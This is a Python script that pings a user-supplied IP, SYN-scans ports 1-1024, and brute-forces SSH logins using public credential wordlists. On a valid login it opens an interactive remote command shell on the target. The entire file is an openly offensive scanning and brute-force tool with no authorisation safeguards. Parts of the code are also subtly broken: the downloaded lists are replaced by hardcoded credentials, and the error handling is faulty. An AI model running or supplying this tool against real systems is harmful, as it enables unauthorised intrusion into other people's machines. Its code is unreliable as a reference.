import subprocess
import sys
from os import getcwd

required = { # These are the required libraries that will be installed in your computer incase you dont have the packages installed already
    'requests' : 'requests',
    'paramiko' : 'paramiko',
    'scapy.all' : 'scapy',
    'pwn' : 'pwntools'
}

for module, package in required.items(): #installing and importing required modules using import and pip
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

from scapy.all import *
import requests
import paramiko
from pwn import *


def listsCreation(): # This port scanner will also try to bruteforce ssh if open, this is the function that will download and use the lists
    username_list_request = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt"
    password_list_request = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
    r_username = requests.get(username_list_request)
    r_password = requests.get(password_list_request)
    username_file = open(str(getcwd() + '/usernamefile.txt') , 'wt').write(r_username.text)
    username_file = open('usernamefile.txt' , 'rt')
    password_file = open(str(getcwd() + '/passwordfile.txt') , 'wt').write(r_password.text)
    password_file = open('passwordfile.txt' , 'rt')
    usernamelist = []
    for n in r_username.text:
        n = username_file.readline().strip()
        if len(n)>0:
            usernamelist.append(n)
    passwordlist = []
    for n in r_password.text:
        n = password_file.readline().strip()
        if len(n)>0:
            passwordlist.append(n)
    return usernamelist, passwordlist

usernamelist, passwordlist = listsCreation()
target = input("Please enter target IP: ") # Interactive program, you will write your own wanted IP address for the target
while True:
    int_name = 'en0'
    ip_packet = IP(dst=target)
    icmp_packet = ICMP()
    pingpacket = ip_packet/icmp_packet
    ans, unans = sr(pingpacket, timeout=2, iface=int_name) #send ICMP packet
    if len(ans) > 0: # check for response in list called ans
        print("Target: " + target + ' is alive.')
        print("Starting TCP port scanning")
        res, unans = sr(IP(dst=target)/TCP(flags="S", dport=(1,1024))) # start TCP port scan for ports 1-1024
        openports = []
        for s, r in res: # go over answers in res list
            if r.haslayer(TCP) and r[TCP].flags == "SA": #filter only syn-ack responses in res list
                openports.append(r[TCP].sport) # add filtered ports to openports list
        found_open = any(r[TCP].flags == "SA" for s, r in res if r.haslayer(TCP)) # make sure its only TCP packets and nothing else line ICMP
        if len(openports) >= 1: # if there are any open ports in open ports list
            print("found " + str(len(openports)) + " open ports")
            res.summary(lfilter = lambda s,r: r.sprintf("%TCP.flags%") == "SA", prn=lambda s,r: r.sprintf("%TCP.sport% is open")) # printing what are the open ports
            if 22 in openports: # check if ssh is one of the open ports
                TIMEOUT = 5
                target = target
                connection = False
                quit_requested = False
                usernamelist = ['avi', 'guest']
                passwordlist =['123' , '123456']
                for name in usernamelist: # starting to bruteforce ssh
                    name = str(name).strip("\n")
                    print("Trying username: " + name)
                    for password in passwordlist:
                        password = str(password).strip("\n")
                        print("Trying password: " + password)
                        try:
                            response = ssh(host=target, user=str(name), password=str(password),timeout=TIMEOUT) #checking for response
                            if response.connected(): #if credentials used in the password and username list are valid:
                                connection = True # variable that will be used later to quit the loop
                                print("username: \n " + str(name) + "\npassword \n" + str(password) + "\nare valid!" ) # printing the valid credentials
                                choice = input("Would You like to connect? y/n ")
                                while True:
                                    if choice == 'y':
                                        try:
                                            client = paramiko.SSHClient()  #starting ssh connection with valid credentials
                                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                            client.connect(target,username=name, password=password)
                                            while True:
                                                command = input('>')
                                                if command == 'quit': # setting 'quit' as exiting program
                                                    print('Quitting program')
                                                    client.close()
                                                    quit_requested = True
                                                    break
                                                stdin, stdout, stderr = client.exec_command(command) #printing out command response
                                                print(stdout.read().decode()) #printing out command response
                                                print(stderr.read().decode()) #printing out command errors
                                        except Exception as e:
                                            print("An error occurred:\n" + e)
                                        break
                                    elif choice == 'n':
                                        print("Quitting program")
                                        break
                                    else:
                                        choice = input("Please type y/n: ")
                                break
                        except Exception as security_exception: # alerting used username and password are wrong
                            log.failure(
                                "[!] Couldn't check security settings".format(target, security_exception))
                    if connection or quit_requested:
                        break
                if not connection and not quit_requested: # if no success with connection
                    print("No valid username and password found")
            else:
                print("No open SSH port found")
                break
        else:
            print("No open ports found")
            break
    elif len(ans) == 0:
        print("Target: " + target + ' is not alive.')
        target = input("Please enter target IP or type quit to quit: ")
        if target == 'quit':
            break
    break
